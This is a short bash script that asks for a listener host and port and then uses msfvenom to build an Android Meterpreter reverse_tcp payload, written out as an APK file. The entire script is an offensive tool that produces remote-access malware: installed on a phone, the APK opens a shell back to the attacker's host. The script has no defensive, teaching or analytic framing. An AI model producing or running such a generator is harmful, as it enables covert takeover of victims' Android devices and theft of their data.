#!/bin/bash

#!/bin/bash

read -p "[+] Enter LHOST : " LHOST
read -p "[+] Enter LPORT : " LPORT

echo "LHOST : $LHOST"
echo "LPORT : $LPORT"


sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT R > /opt/wd-generated/apkpayload.apk